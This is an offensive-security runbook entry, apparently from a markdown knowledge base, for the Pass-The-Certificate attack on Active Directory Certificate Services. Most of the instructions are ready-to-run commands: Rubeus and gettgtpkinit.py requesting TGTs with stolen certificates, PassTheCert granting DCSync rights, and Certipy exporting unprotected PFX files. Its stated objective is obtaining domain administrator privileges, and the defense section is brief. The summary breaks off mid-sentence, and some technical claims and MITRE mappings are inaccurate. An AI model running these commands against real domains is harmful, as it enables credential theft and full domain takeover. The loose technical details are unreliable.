---
id: 237f28fa-f476-4c78-9b50-6d471c1ee559
name: Pass-The-Certificate Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.189678+00:00'
updated_at: '2023-04-10T20:26:17.399463+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
- '[[Bypass User Account Control|T1088 - Bypass User Account Control]]'
- '[[Pass the Ticket|T1097 - Pass the Ticket]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Active Directory Certificate Services]]'
- '[[Pass-The-Certificate]]'
commands:
- '[[certutil dump]]'
- '[[Export unprotected PFX certificate using Certipy]]'
- '[[Get TGT using Base64-encoded PFX certificate]]'
- '[[Get TGT using PEM certificate and private key]]'
- '[[Get TGT using PFX certificate and password]]'
- '[[PassTheCert grant DCSync]]'
- '[[PassTheCert restore]]'
- '[[Rubeus asktgt]]'
---

# Pass-The-Certificate Attack

## Summary

A Pass-The-Certificate attack is a technique used by attackers to obtain domain administrator privileges in Active Directory. The attack involves compromising an Active Directory Certificate Services (AD CS) server and then using the stolen certificate to generate a forged Kerberos ticket granting 

## Description

# Description

A Pass-The-Certificate attack is a technique used by attackers to obtain domain administrator privileges in Active Directory. The attack involves compromising an Active Directory Certificate Services (AD CS) server and then using the stolen certificate to generate a forged Kerberos ticket granting ticket (TGT). This TGT can then be used to obtain domain administrator privileges.

From a technical perspective, the attack involves stealing a certificate from an AD CS server and then using this certificate to generate a forged TGT. This TGT can then be used to obtain domain administrator privileges. The attack is successful because the forged TGT is signed by a trusted certificate authority, making it difficult to detect.

The business value of this attack is that it allows an attacker to gain full control over an organization's Active Directory environment, which can be used to steal sensitive data, install backdoors, and carry out other malicious activities.

 

## Requirements

1. Access to an Active Directory Certificate Services server

 

## Defense

1. Limit the number of users who have access to the AD CS server

1. Monitor for unusual certificate requests or activity on the AD CS server

1. Implement multi-factor authentication to prevent unauthorized access to the AD CS server

 

## Objectives

1. Obtain domain administrator privileges

1. Compromise an Active Directory Certificate Services server

 

# Instructions

1. Use the following commands to manage certificates:

 



**Code**: [[# Information about a cert file
certutil -v -dump ]]



> The first command is used to get information about a certificate file. The second command is used to ask for a TGT ticket using a certificate. The third command is used to grant DCSync rights to a user. The last command is used to restore the previous state of the system after running the third command.



**Command** ([[certutil dump]]):

```bash
certutil -v -dump admin.pfx
```





**Command** ([[Rubeus asktgt]]):

```bash
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
```





**Command** ([[PassTheCert grant DCSync]]):

```bash
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid <user_SID>
```





**Command** ([[PassTheCert restore]]):

```bash
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration_file.txt
```



2. The gettgtpkinit.py command can be used to obtain a Ticket Granting Ticket (TGT) using PKINIT. There are multiple ways to provide the required certificate and private key information. These are:

 



**Code**: [[# Base64-encoded PFX certificate (string) (passwor]]



> - Base64-encoded PFX certificate (string) (password can be set)
  - Use the -pfx-base64 option followed by the base64-encoded certificate string and provide the FQDN domain name and target SAM account name along with the path to the TGT ccache file.

- PEM certificate (file) + PEM private key (file)
  - Use the -cert-pem and -key-pem options followed by the paths to the PEM certificate and private key files respectively. Provide the FQDN domain name and target SAM account name along with the path to the TGT ccache file.

- PFX certificate (file) + password (string, optional)
  - Use the -cert-pfx option followed by the path to the PFX certificate file. Use the -pfx-pass option followed by the password if the certificate is password-protected. Provide the FQDN domain name and target SAM account name along with the path to the TGT ccache file.

- Using Certipy
  - Use the certipy auth command followed by the -pfx option and the path to the PFX certificate file. Provide the domain controller IP, username and domain name. Then use the certipy cert command followed by the -export and -pfx options along with the path to the PFX certificate file and the password if the certificate is password-protected. The exported certificate will be saved in the specified path.



**Command** ([[Get TGT using Base64-encoded PFX certificate]]):

```bash
gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```





**Command** ([[Get TGT using PEM certificate and private key]]):

```bash
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```





**Command** ([[Get TGT using PFX certificate and password]]):

```bash
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```





**Command** ([[Export unprotected PFX certificate using Certipy]]):

```bash
certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Lateral Movement|TA0008 - Lateral Movement]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]
- [[Bypass User Account Control|T1088 - Bypass User Account Control]]
- [[Pass the Ticket|T1097 - Pass the Ticket]]

## Commands Used

- [[certutil dump]]
- [[Export unprotected PFX certificate using Certipy]]
- [[Get TGT using Base64-encoded PFX certificate]]
- [[Get TGT using PEM certificate and private key]]
- [[Get TGT using PFX certificate and password]]
- [[PassTheCert grant DCSync]]
- [[PassTheCert restore]]
- [[Rubeus asktgt]]

## Tags

- [[Active Directory Attacks]]
- [[Active Directory Certificate Services]]
- [[Pass-The-Certificate]]


